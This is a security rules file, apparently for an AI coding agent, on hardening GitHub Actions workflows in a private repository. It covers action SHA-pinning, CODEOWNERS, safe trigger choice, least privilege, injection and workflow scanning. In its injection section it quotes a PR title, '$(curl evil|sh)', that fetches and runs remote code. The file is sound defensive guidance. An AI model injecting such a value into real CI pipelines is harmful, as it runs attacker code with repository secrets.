---
name: gha-security
description: Security rules for GitHub Actions workflows. Use when creating or editing any file under .github/workflows/ or .github/actions/, or touching CODEOWNERS / branch protection for CI.
---

Apply every rule below when authoring or editing a workflow. The repo's ruleset **requires** SHA-pinned actions — an unpinned action will fail the check. Never relax a rule to make CI pass; fix the workflow.

## 1. Pin every action to a full commit SHA

Tags and branches are mutable — a compromised maintainer (or a force-pushed tag) can swap the code behind `@v4` without changing your file. A 40-char commit SHA is immutable.

```yaml
# ✅ correct — full SHA + version comment
uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7.0.0

# ❌ wrong — mutable ref
uses: actions/checkout@v7
uses: actions/checkout@main
```

Applies to **all** actions including first-party `actions/*`, `pnpm/*`, and any reusable workflow called via `uses:`. The trailing `# vX.Y.Z` comment is mandatory (Renovate maintains it on each SHA bump and it keeps humans sane).

To resolve a tag to its SHA:
```bash
gh api repos/<owner>/<repo>/git/refs/tags/<tag> --jq '.object.sha'
# if that returns an annotated-tag object, dereference it:
gh api repos/<owner>/<repo>/git/tags/<sha> --jq '.object.sha'
```

## 2. Protect the workflow definition itself

Anyone who can open a PR can edit a workflow file in that PR. Two layers stop a malicious edit from running with privileges:

- **CODEOWNERS** — `.github/CODEOWNERS` assigns `/.github/`, `/.github/workflows/`, and `CODEOWNERS` itself to `@IRT-Global/isw-admin`. Any workflow change then requires admin review via its own PR. The owning team must have **write** (isw-admin has admin ✓), or GitHub silently ignores the rule.
- **Branch protection** — the active `human PR rules` ruleset enforces it: `require_code_owner_review: true` + `required_approving_review_count: 1` + `require_last_push_approval: true`. CODEOWNERS *requests* the review; the ruleset *blocks* the merge. Don't weaken either.
- **Choose the trigger deliberately** — see §3. The event decides *which copy* of the workflow runs and *what credentials* it gets.

## 3. `pull_request` vs `pull_request_target` — pick by what the job does

These are NOT interchangeable. The difference is security-critical:

| | `pull_request` | `pull_request_target` |
|---|---|---|
| Workflow def that runs | **from the PR head** (PR can modify it) | **from the base branch** (PR cannot modify it) |
| Secrets / write token on fork PRs | ❌ none, read-only token | ✅ full secrets + write token |
| Checking out & running PR code | safe | **DANGEROUS** |

Rules:

- **Build / lint / test workflows that execute PR code** (e.g. `ci.yml` running `pnpm install` + `pnpm test`) → keep `pull_request`. Forks get a read-only token and **no secrets**, so a malicious PR editing the workflow cannot exfiltrate anything. This is the safe default — do **not** "upgrade" it to `pull_request_target`.
- **`pull_request_target` is only for jobs that must run with secrets/write and do NOT execute untrusted PR code** — labelling, triaging, posting comments, size checks. The base-branch copy runs, so the PR can't tamper with it.
- **Never** combine `pull_request_target` with `actions/checkout` of the PR head ref (`github.event.pull_request.head.sha`) followed by build/test/`run` of that code — that runs attacker code with your secrets. This is the single most exploited Actions misconfiguration.

So the §-example concern ("ci.yml could be modified in a PR") is real, but the fix for a *test* workflow is CODEOWNERS + branch protection (§2) + GitHub's *Require approval for fork PR runs* setting — **not** switching it to `pull_request_target`.

If a workflow genuinely must build/test untrusted PR code **and then** act with secrets, use the **split pattern** instead of `pull_request_target`:

1. An unprivileged `pull_request` workflow builds the PR code (no secrets) and uploads results as an artifact.
2. A separate `workflow_run` workflow (triggered on the first one completing) runs privileged, downloads the artifact, and acts.

Harden the privileged half:
- Treat every downloaded artifact as **untrusted** — extract to a temp dir (`/tmp`), never auto-expand over the workspace (**artifact poisoning**).
- Validate artifact contents before use; never pipe them into `$GITHUB_ENV` / `$GITHUB_OUTPUT` (see §5).
- Filter on `github.event.workflow_run.conclusion == 'success'` and the expected source branch.

If you must use `pull_request_target` directly: check out `github.event.pull_request.head.sha` (immutable) **not** `head.ref` (mutable race / TOCTOU), gate on `github.event.pull_request.head.repo.owner.login == 'IRT-Global'` or a trusted-actor check, and still never `run:` the checked-out code.

Avoid `issue_comment` / ChatOps triggers as approval gates — they're TOCTOU-prone and bypass PR review. Prefer a label gate pinned to a specific commit SHA.

## 4. Least-privilege permissions

Set a read-only default at the top, escalate per-job only as needed:
```yaml
permissions:
  contents: read        # top-level default for all jobs
jobs:
  comment:
    permissions:
      pull-requests: write   # only the job that needs it
```
Never use blanket `permissions: write-all`.

## 5. Prevent injection from untrusted input

**Untrusted sources** (attacker-controlled in a fork PR): `github.event.*` fields (PR/issue title, body, branch/ref name, author login, commit message), `git` output (`git log`, `git diff-tree`), downloaded artifacts, and third-party action outputs.

**Script injection** — never interpolate an untrusted value straight into `run:`:
```yaml
# ❌ injection — PR title "$(curl evil|sh)" executes
- run: echo "${{ github.event.pull_request.title }}"

# ✅ pass through an env var, quote on use
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "$TITLE"
```

**Environment / output injection** — writing untrusted content into the `$GITHUB_ENV` or `$GITHUB_OUTPUT` files lets an attacker inject arbitrary env vars (e.g. `LD_PRELOAD`, `PATH`) or clobber another step's outputs. Never echo untrusted data into them; if you must, validate against a strict allowlist first and beware multiline payloads.

**Path injection** — don't build file paths from untrusted input without validation (path traversal into the workspace or runner).

## 6. Scan workflows automatically

Manual review misses things. Two scanners, different cost/coverage:

**zizmor (free, in use)** — `.github/workflows/zizmor.yml` runs `zizmorcore/zizmor-action` on every `.github/**` change, and `.githooks/pre-commit` runs the same audit locally (offline, regular persona) whenever a workflow file is staged, so misconfigs are caught before push. Catches the workflow classes in this skill: unpinned actions, template/script injection, dangerous `pull_request_target`, excessive permissions, artifact/cache issues, self-hosted exposure. Runs with `advanced-security: false` → GitHub annotations + **fails the job on findings** (SARIF upload to the code-scanning dashboard needs GHAS, which a private repo lacks). Don't fix a zizmor failure by silencing it — fix the workflow, or add a justified `# zizmor: ignore[rule]` with a reason. Keep the action **and** its `version:` pinned (§1).

**CodeQL (GHAS-gated, not enabled)** — adds deep taint analysis of the **app code** (TS/JS) plus 18 Actions query classes. The CodeQL *engine* is proprietary; free only for public/OSI repos. This repo is **private**, so CodeQL code scanning requires a paid **GitHub Code Security** seat (per active committer; org is on Enterprise = eligible). If/when licensed: enable Default Setup, or advanced setup with `actions` + `javascript-typescript` in the language matrix. Until then, zizmor covers the workflow-security subset.

## 7. Self-hosted runners

Never run **public-repo or fork PR** workloads on a self-hosted runner — untrusted code executes on a host you own and persists state between jobs (CodeQL: *Code Execution on Self-Hosted Runners*). Use ephemeral GitHub-hosted runners for those; reserve self-hosted for trusted, internal-only workflows.

## 8. Other defaults

- `concurrency:` group with `cancel-in-progress: true` to kill superseded runs.
- `persist-credentials: false` on `actions/checkout` unless the job pushes back.
- Prefer OIDC (short-lived federated creds) over long-lived cloud secrets.
- SHA bumps arrive as reviewable PRs via **Renovate** (config on its own branch). Renovate pins digests and keeps the `# vX.Y.Z` comment current — `helpers:pinGitHubActionDigests` (or `config:recommended`) handles the `github-actions` manager. Do not add a Dependabot config; this repo uses Renovate.
- Gate privileged jobs behind a GitHub *Environment* with required reviewers when they touch prod.

## Pre-merge checklist for any workflow change

- [ ] Every `uses:` is a full SHA with a `# vX.Y.Z` comment
- [ ] Trigger event matches what the job does (§3); no `pull_request_target` + checkout-and-run of PR head
- [ ] Top-level `permissions:` is read-only; per-job escalation is minimal
- [ ] No untrusted input (`${{ github.event.* }}`, git output, artifacts) in `run:`, `$GITHUB_ENV`, or `$GITHUB_OUTPUT`
- [ ] Downloaded artifacts treated as untrusted (temp dir, validated)
- [ ] No untrusted PR workload on a self-hosted runner
- [ ] CODEOWNERS covers `.github/` so this change required owner review
